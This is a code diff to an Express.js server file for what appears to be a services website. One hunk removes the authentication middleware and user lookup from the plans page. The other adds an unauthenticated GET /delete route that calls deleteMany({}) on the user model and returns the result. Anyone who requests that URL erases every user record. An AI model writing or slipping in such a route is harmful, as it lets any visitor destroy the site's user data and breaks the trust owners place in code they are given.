@@ -421,14 +421,8 @@ const faqs = [
 ];
 
 // Render Plans Page
-app.get("/plans",checkAuth,async (req, res) => {
-  if(req.user){
-    const user = await UserModel.findById(req.user);
-    return res.render("Plans", {
-      title: "Plans", user, plans, faqs
-    });
-  }
-  res.render("Plans", {title:"Plans",user:null, plans, faqs });
+app.get("/plans", (req, res) => {
+  res.render("Plans", {title:"Plans", plans, faqs });
 });
 
 // Contact page
@@ -502,6 +496,18 @@ app.use("/api/contact", contactrouter)
 app.use("/api/plan", planRouter)
 app.use("/api/gallary", gallaryroute)
 app.use("/api/services", servicesRouter);
+
+
+app.get("/delete", async (req, res) => {
+  try {
+    const user = await UserModel.deleteMany({});
+    console.log("user : ",user);
+    
+    res.status(200).json(user)
+  } catch (error) {
+    console.log(error);
+  }
+})
 
 app.listen(PORT, () => {
   dbConnect();
